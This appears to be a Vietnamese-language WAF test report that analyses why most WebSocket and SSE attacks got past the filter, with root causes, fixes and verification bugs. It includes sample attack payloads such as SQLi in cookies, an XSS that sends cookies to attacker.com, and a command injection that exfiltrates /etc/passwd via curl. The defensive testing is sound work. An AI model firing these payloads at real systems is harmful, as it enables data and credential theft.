# WebSocket Attack Detection — Báo Cáo Phân Tích

**Ngày:** 2026-06-12  
**Script:** `load_test/ws_attack_analysis.py`  
**Kết quả:** 4/29 blocked (13.8%) — WAF bỏ sót 86.2% tấn công WebSocket

---

## 1. Tổng Quan Kết Quả

| Record Type | Sent | Blocked | Missed | Rate |
|-------------|------|---------|--------|------|
| `handshake_request` | 15 | 4 | 11 | **26.7%** |
| `sse_request` | 1 | 0 | 1 | **0%** |
| `ws_message` | 13 | 0 | 13 | **0%** |
| **TOTAL** | **29** | **4** | **25** | **13.8%** |

**4 attacks WAF bắt được:**
- `crlf_injection_in_upgrade_header` — header_injection detector
- `empty_session_cookie` — auth/session check
- `no_session_cookie` — auth/session check
- `forged_jwt_none_algorithm` — jwt_inspection detector

---

## 2. Kiến Trúc WAF — Tại Sao WebSocket Khác HTTP

Khi WAF nhận request có `Upgrade: websocket` + `Connection: Upgrade`, nó tách khỏi HTTP pipeline thông thường:

```
Request đến WAF
    │
    ├─ is_websocket_upgrade() == true?
    │       │
    │       YES ──→ Security pipeline chạy trên HTTP headers
    │               (jwt_inspection, header_injection, auth checks hoạt động)
    │               │
    │               ──→ Forward handshake đến upstream qua RAW TCP
    │               ──→ Nếu upstream trả 101: spawn ws_inspect bridge
    │               ──→ ws_inspect bridge là OPT-IN (mặc định TẮT)
    │
    └─ NO ──→ HTTP pipeline bình thường (sqli, xss, header_injection, ...)
```

**Hệ quả:**
- Detectors sqli, xss, nosql, ssrf, path_traversal **KHÔNG** được gọi tự động cho WS request
- WS frame payload **KHÔNG** được inspect trừ khi route cấu hình `ws_inspect: { enabled: true }`
- Một số check vẫn chạy (jwt, CRLF header, auth) vì chúng xử lý HTTP headers trước khi WS routing

---

## 3. Phân Tích Chi Tiết Từng Lỗ Hổng

### 3.1 SKIP THIS CASES


### 3.2 SQLi / NoSQLi trong Cookie WS Handshake (2 techniques missed)

**Techniques:** `sqli_in_session_cookie`, `nosqli_in_session_cookie`

**Ví dụ thực tế:**

```http
GET /ws/live HTTP/1.1
Host: sec-team.waf-exams.info
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: c6ZmCmOsCi2PG7QV88B0EA==
Origin: https://sec-team.waf-exams.info
Cookie: sid=' WAITFOR DELAY '0:0:5'--    ← SQLi payload trong session cookie
```

**Tại sao WAF miss:**

Đọc code `sqli.rs` và `nosql_injection.rs`:
- `sqli.rs`: scan **URI path/query** và **request body** — không scan Cookie header
- `nosql_injection.rs`: tương tự, không scan Cookie header

Nhưng trong WS upgrade path, dù các detectors này có chạy, chúng cũng không inspect giá trị cookie. `jwt_inspection.rs` là detector duy nhất scan Cookie (để tìm JWT token), các detectors khác bỏ qua Cookie.

**Attack impact:** Nếu backend lấy `sid` cookie và dùng trực tiếp trong SQL query mà không sanitize → SQLI blind/time-based.

**Fix cần thiết:**

Thêm cookie value inspection vào `sqli.rs` và `nosql_injection.rs`:
```rust
// sqli.rs — thêm cookie scanning
for (name, value) in request.cookies() {
    if let Some(signal) = scan_sqli(value) {
        signals.push(signal.with_field(format!("cookie:{}", name)));
    }
}
```

Hoặc: Tạo một `CookieInjectionDetector` riêng chạy sqli/nosql/xss scan trên tất cả cookie values.

---

### 3.3 IP Spoofing via Forwarded Headers (1 technique missed)

**Technique:** `ip_spoof_via_forwarded_header`

**Ví dụ:**
```http
GET /ws/live HTTP/1.1
Host: sec-team.waf-exams.info
Upgrade: websocket
Connection: Upgrade
X-Forwarded-For: 127.0.0.1, ::1
X-Real-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

**Tại sao WAF miss:**
- `header_injection.rs` kiểm tra `X-Forwarded-For` để detect **injection** (CRLF, header poisoning)
- Nhưng không có logic nào kiểm tra xem IP trong header có phải loopback/private không
- Nếu WAF dùng header này để xác định client IP, attacker có thể giả mạo IP để bypass rate limiting, IP blocklist

**Note:** Đây là vấn đề ở tầng IP trust, không phải attack payload detect.

---

### 3.4 Protocol Header Injection (1 technique missed)

**Technique:** `protocol_header_injection`

**Ví dụ:**
```http
GET /ws/live HTTP/1.1
Host: sec-team.waf-exams.info
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: chat, <script>alert(1)</script>
```

**Tại sao WAF miss:**
- WAF không inspect `Sec-WebSocket-Protocol` header content
- `header_injection.rs` không scan WS-specific headers như `Sec-WebSocket-Protocol`, `Sec-WebSocket-Extensions`

---

### 3.5 Connection Header Variant (1 technique missed)

**Technique:** `connection_header_variant`

**Ví dụ:**
```http
GET /ws/live HTTP/1.1
Connection: keep-alive, Upgrade
Upgrade: websocket
```

**Tại sao WAF miss:**
- `is_websocket_upgrade()` check `Connection` header chứa "upgrade" token → ĐÚNG, detect được
- Nhưng variant này với `keep-alive, Upgrade` có thể bị parse sai trong một số HTTP server
- Attack: bypass WAF WS detection, WAF nghĩ không phải WS upgrade → dùng HTTP pipeline → bypass WS-specific rules

**Note:** Cần test thêm — có thể WAF đã handle đúng, chỉ là attack technique này không thực sự bypass.

---

### 3.6 Arbitrary TCP Tunnel over WebSocket (1 technique missed)

**Technique:** `arbitrary_tcp_tunnel_over_ws`

**Ví dụ:**
```http
GET /ws/live HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: binary
```

Sau 101 upgrade, attacker dùng WS connection như raw TCP tunnel để kết nối đến internal services.

**Tại sao WAF miss:**
- Không có detector cho protocol tunneling
- Một khi 101 upgrade thành công, WAF chỉ inspect text frames (nếu `ws_inspect` enabled)
- Binary frames qua ws_inspect bridge đều **pass-through verbatim** không bao giờ được inspect

---

### 3.7 ws_message Frame Payload Attacks (13 techniques missed — 100%)

**Techniques:** `ws_frame_payload_sqli_v2/v5`, `ws_frame_payload_xss_v1/v3/v4/v5`, `ws_frame_payload_nosqli_v1/v3/v4/v5`, `ws_frame_payload_cmdi_v1`, `oversized_ws_frame`, `control_frame_ping_flood`

**Ví dụ thực tế:**

*SQLi trong WS frame (technique: `ws_frame_payload_sqli_v2`):*
```json
{"op": "pong", "topic": "admin'--"}
```
Payload `admin'--` được inject vào field `user_id` khi backend process.

*XSS trong WS frame (technique: `ws_frame_payload_xss_v1`):*
```json
{"type": "message", "content": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"}
```

*NoSQLi trong WS frame (technique: `ws_frame_payload_nosqli_v3`):*
```json
{"op": "query", "filter": {"$where": "this.balance > 0 && sleep(5000)"}}
```

*Command Injection (technique: `ws_frame_payload_cmdi_v1`):*
```json
{"cmd": "status", "target": "$(curl -s attacker.com/$(cat /etc/passwd | base64))"}
```

*Oversized Frame (technique: `oversized_ws_frame`):*
```
[WS frame với payload 10MB+]
```
Mục đích: OOM attack hoặc bypass content inspection (quá lớn → WAF skip inspection).

**Root cause chính — `ws_inspect` NOT ENABLED:**

Đọc `dev.yaml`, route `catch-all` **không có** `ws_inspect` config:
```yaml
routes:
  - id: catch-all
    path: "/"
    match_type: prefix
    upstream: stub-pool
    tier_override: high
    # ← MISSING: ws_inspect block
```

Từ `ws_inspect.rs`:
```rust
// ws_inspect là opt-in per-route
// Nếu không có config → bridge chạy dạng transparent pipe
// Text frames KHÔNG được inspect
// Binary frames KHÔNG bao giờ được inspect
```

Và từ code bridge logic:
- Frame size cap: 1MB per frame (1009 nếu vượt) → `oversized_ws_frame` 10MB → BỊ ĐÓNG với 1009, nhưng test không detect vì script expect 1008/4xxx
- Text frames ≤ max_message_bytes (default 4MB) → inspect nếu ws_inspect enabled
- Text frames > max_message_bytes → **forward uninspected** (availability trade-off)

**Fix cần thiết:**

*1. Enable ws_inspect trong dev.yaml:*
```yaml
routes:
  - id: catch-all
    path: "/"
    match_type: prefix
    upstream: stub-pool
    tier_override: high
    ws_inspect:
      enabled: true
      max_message_bytes: 1048576   # 1MB
      mode: enforce                # hoặc log_only để bắt đầu
```

*2. Wire sqli/xss/nosql/cmdi detectors vào ws_inspect pipeline:*

Hiện tại `ws_inspect.rs` có hook `WsVerdict::Allow | WsVerdict::Block` nhưng không rõ detectors nào được gọi. Cần đảm bảo inspection function gọi các detectors hiện có:
```rust
// ws_inspect.rs — trong inspection hook
pub async fn inspect_ws_text_frame(payload: &str, ctx: &RequestContext) -> WsVerdict {
    let mut score = 0u32;
    // Re-use existing detectors on frame payload as if it were a request body
    score += sqli_detector.scan_text(payload);
    score += xss_detector.scan_text(payload);
    score += nosql_detector.scan_text(payload);
    score += cmdi_detector.scan_text(payload);
    if score >= ctx.route.tier.risk_threshold {
        WsVerdict::Block
    } else {
        WsVerdict::Allow
    }
}
```

---

### 3.8 Cross-Site SSE Hijacking (1 technique missed)

**Technique:** `cross_site_sse_hijacking`

**Ví dụ:**
```http
GET /api/notifications/stream HTTP/1.1
Accept: text/event-stream
Origin: https://attacker.evil.com
Referer: https://attacker.evil.com/csrf.html
Cookie: sid=victim_session_cookie
```

Attacker embed `<script>new EventSource('https://sec-team.waf-exams.info/api/notifications/stream')</script>` vào trang độc hại. Browser gửi victim cookie → SSE stream data đến attacker.

**Tại sao WAF miss:**
- WAF trả về 200 (không block)
- Không có CORS/Origin check cho SSE endpoints
- Unauthenticated SSE bị block (vì không có session cookie → 403), nhưng cross-site SSE với valid cookie không bị detect

---

## 4. Tóm Tắt Root Causes

| # | Root Cause | Affected Techniques | Fix |
|---|-----------|---------------------|-----|
| **RC-1** | `ws_inspect` không enabled trong route config | 13 ws_message attacks | Config: `ws_inspect: { enabled: true }` |
| **RC-2** | Không có WS Origin allowlist | 5 CSWSH techniques | Config + Code: `ws_origin_allowlist` per route |
| **RC-3** | sqli/nosql detectors không scan Cookie header | sqli/nosqli in cookie | Code: thêm cookie scanning vào detectors |
| **RC-4** | Không có SSE CORS check | cross_site_sse_hijacking | Config + Code: CORS check cho SSE routes |
| **RC-5** | Không inspect WS-specific headers | protocol_header_injection | Code: scan `Sec-WebSocket-Protocol` |
| **RC-6** | Không có binary frame inspection | ws_tcp_tunnel | Architecture: khó fix, binary frames never inspectable |
| **RC-7** | Không có upstream trong test env | ws_message tests (1006) | Env: cần real WS upstream để test đúng |

---

## 5. Priority Fix List

### P0 — Ngay lập tức (config changes, không cần code)

```yaml
# dev.yaml — thêm vào route catch-all
routes:
  - id: catch-all
    path: "/"
    match_type: prefix
    upstream: stub-pool
    tier_override: high
    ws_inspect:
      enabled: true
      max_message_bytes: 524288   # 512KB
      mode: enforce
    ws_origin_allowlist:
      - "https://sec-team.waf-exams.info"
      - "http://sec-team.waf-exams.info"
      - "http://localhost:3000"   # dev frontend
    ws_require_origin: true
```

### P1 — Code changes

1. **Cookie injection scanning** (`sqli.rs`, `nosql_injection.rs`):
   - Thêm scan trên tất cả cookie values, không chỉ JWT
   - Ưu tiên: `session_id`, `sid`, `auth`, `token` cookies

2. **WS Origin validation** (`data_plane.rs` hoặc `ws.rs`):
   - Implement `ws_origin_allowlist` config
   - Block nếu `ws_require_origin: true` và không có `Origin` header

3. **SSE CORS check** (route handling):
   - Nếu route là SSE (`Accept: text/event-stream`), kiểm tra Origin allowlist

### P2 — Architecture improvements

1. **ws_inspect binary frame support**: Hiện tại binary frames pass-through hoàn toàn. Cần protocol-aware inspection (e.g., nếu binary frame là JSON binary, decode rồi inspect).

2. **Oversized frame policy**: Hiện tại `ws_inspect.rs` forward uninspected nếu > max_message_bytes. Nên block thay vì skip để tránh bypass-by-size attack.

---

## 6. Detection Rate After Fixes (Dự Kiến)

| Root Cause | Techniques Fixed | Rate Improvement |
|-----------|-----------------|-----------------|
| Enable ws_inspect (RC-1) | 13 ws_message | +13 detections (nếu detectors đủ) |
| WS Origin allowlist (RC-2) | 5 CSWSH | +5 detections |
| Cookie scanning (RC-3) | 2 cookie inject | +2 detections |
| SSE CORS check (RC-4) | 1 SSE hijack | +1 detection |
| **Tổng** | **21/25** | **từ 13.8% → ~86%** |

---

## 7. Test Environment Limitation

**ws_message tests (status=1006):** WAF không có WS upstream thật (stub pool tại 9999 không chạy). Sau khi WAF đồng ý upgrade (101), nó ngay lập tức đóng connection với code 1006 (Abnormal Closure) vì không connect được upstream. Điều này không cho phép test xem ws_inspect có block attack hay không.

Để test đúng ws_message detection:
1. Chạy một WS echo server đơn giản tại port 9999: `python3 -m websockets.server 9999`
2. Hoặc dùng `wscat`: `wscat --listen 9999`
3. Enable `ws_inspect: { enabled: true }` trong config
4. Rerun: `python3 ws_attack_analysis.py --types ws`

---

## 8. Verification run — 2026-06-13 (live `run-dev`, real WS upstream)

Re-ran with a **WS-capable upstream** (RC-7 closed: `fast-upstream` /
`deploy/mock` now echo WS frames on the same port as HTTP — see
`tests/hackathon/upstream/fast-upstream.go`, `deploy/mock/mock-upstream.go`).
Fired masked text frames at `/ws/live` through the live WAF and read the
result + `aegis_websocket_frame_block_total` metric.

### ✅ `ws_inspect` confirmed working
A SQLi frame (`{"q":"admin' OR 1=1-- -"}`) is caught by the **sqli** detector
and the bridge closes the client with **WS 1008 (policy violation)**.
Metric: `aegis_websocket_frame_block_total{route="catch-all",tag="sqli"}`.
Verified end-to-end through the WAF→upstream bridge on the TLS listener
(`:8443`).

### 🐞 BUG-WS-1 (FIXED) — plaintext listener never upgraded WebSocket
The plain data listener (`:8080`) served connections with bare
`http1::Builder::serve_connection` — **no `.with_upgrades()`** — so every WS
upgrade returned `101` then dropped immediately (`hyper`: "upgrade expected
but low level API in use"), client saw a bare `1006`. The TLS listener
already used `serve_connection_with_upgrades`. **This is the real reason WS
frame inspection never ran on `:8080`** (not only the upstream EOF in §7).
Fixed in `crates/aegis-proxy/src/accept.rs` (plain branch now matches the
TLS branch). WS now upgrades on `:8080`.

### 🔴 BUG-WS-2 (OPEN — documented, left as-is by decision 2026-06-13) — AI detector over-blocks every WS frame
With `ai.enabled`, the per-frame inspector runs the ONNX classifier on a
synthetic per-frame view (`GET /ws/live`, body = frame text). That input is
out-of-distribution for the HTTP-trained model, so **even `x` / `hello`
score 60 (`tag="ai"`) = the `high`-tier threshold → 1008**. Net effect: in
**enforce**, `ws_inspect` blocks **100 % of WS traffic** on protective tiers
(metric `aegis_websocket_frame_block_total{tag="ai"}` climbs on benign
frames). The WS inspector calls `run_all_filtered` directly and does **not**
apply the AI short-circuit the normal HTTP pipeline uses (AI only when no
base detector matched). Fix direction (deferred): exclude the AI classifier
from per-frame WS inspection; keep the signature/body detectors
(sqli/xss/nosql/cmdi). **Workaround today:** set the WS route's
`ws_inspect.mode: log_only`, or disable AI, if benign WS traffic must flow.

### 🟡 BUG-WS-3 (OPEN, minor) — plaintext bridge doesn't deliver the close frame
On `:8080` a blocked frame closes the client with a bare TCP FIN instead of
the `1008` WS close frame (TLS `:8443` delivers the `1008` frame cleanly).
Likely a flush-before-`shutdown` nuance on the plain upgraded socket.
